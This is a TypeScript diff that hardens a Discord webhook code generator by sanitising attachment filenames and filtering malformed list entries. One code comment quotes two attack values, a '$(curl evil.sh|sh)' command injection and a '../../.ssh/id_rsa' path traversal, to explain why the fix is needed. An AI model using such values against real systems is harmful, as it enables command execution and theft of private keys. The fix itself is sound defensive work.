@@ -11,6 +11,14 @@
  * `AttachmentBuilder`, a `discord.File`, a multipart part). An `attachment://`
  * URL that was typed by hand or restored from Discord is collected the same
  * way, since it needs exactly the same upload to resolve.
+ *
+ * Every collected name is reduced to a plain local basename first. The name
+ * becomes a path the generated program opens (`./<name>`) and, in the cURL
+ * target, part of a shell word — and it comes from whoever made the message,
+ * which for a share link or a pasted JSON file is not the person running the
+ * code. Unreduced, `attachment://$(curl evil.sh|sh).txt` ran a command in the
+ * pasted cURL line and `attachment://../../.ssh/id_rsa` uploaded a private key
+ * from every target.
  */
 
 import { stripEditorFields } from "@/core/serialization/normalize";
@@ -63,10 +71,26 @@ const RESOLVED_MEDIA_FIELDS = [
   "attachment_id",
 ] as const;
 
+/**
+ * A filename every target can use verbatim: letters, digits, `.`, `_` and `-`
+ * only — what Discord itself keeps in an attachment name, and nothing a shell,
+ * a path, curl's `-F` syntax (`;`, `,`, `"`) or a string literal reads as
+ * anything but text. No separators and no `..`, so it can only ever name a file
+ * beside the generated program.
+ */
+export function safeAttachmentName(name: string): string {
+  const cleaned = name
+    .replace(/[^A-Za-z0-9._-]/g, "_")
+    .replace(/\.{2,}/g, "_")
+    .replace(/^\.+/, "");
+  return /[A-Za-z0-9]/.test(cleaned) ? cleaned : "file";
+}
+
 export function prepareCodegenInput(message: WebhookMessage): CodegenInput {
   const payload = stripEditorFields(message) as WirePayload;
   const attachments: string[] = [];
   const bySession = new Map<string, string>();
+  const byReference = new Map<string, string>();
 
   const claim = (desired: string): string => {
     if (!attachments.includes(desired)) return desired;
@@ -83,14 +107,24 @@ export function prepareCodegenInput(message: WebhookMessage): CodegenInput {
     if (session) {
       const known = bySession.get(session.blobId);
       if (known) return `${ATTACHMENT_PREFIX}${known}`;
-      const name = claim(session.filename || "file");
+      const name = claim(safeAttachmentName(session.filename || "file"));
       bySession.set(session.blobId, name);
       attachments.push(name);
       return `${ATTACHMENT_PREFIX}${name}`;
     }
     if (url.startsWith(ATTACHMENT_PREFIX)) {
-      const name = url.slice(ATTACHMENT_PREFIX.length);
-      if (name && !attachments.includes(name)) attachments.push(name);
+      const typed = url.slice(ATTACHMENT_PREFIX.length);
+      if (!typed) return url;
+      let name = byReference.get(typed);
+      if (name === undefined) {
+        const safe = safeAttachmentName(typed);
+        // A reference already spelled like a claimed name shares that file, as
+        // it always has; one that only *reduces* to a claimed name stays its own.
+        name = safe === typed ? safe : claim(safe);
+        byReference.set(typed, name);
+        if (!attachments.includes(name)) attachments.push(name);
+      }
+      return `${ATTACHMENT_PREFIX}${name}`;
     }
     return url;
   };
@@ -123,6 +157,16 @@ export function prepareCodegenInput(message: WebhookMessage): CodegenInput {
 
   for (const top of payload.components) walk(top);
   return { payload, attachments };
+}
+
+/**
+ * The object entries of a list field (`options`, `default_values`) — a crafted
+ * payload can carry `null` or a bare string where an entry belongs, and a
+ * generator dereferencing one would throw instead of producing code.
+ */
+export function objectEntries(value: unknown): WireNode[] {
+  if (!Array.isArray(value)) return [];
+  return value.filter((entry): entry is WireNode => !!entry && typeof entry === "object");
 }
 
 /** True when any component needs an application to receive its interaction. */
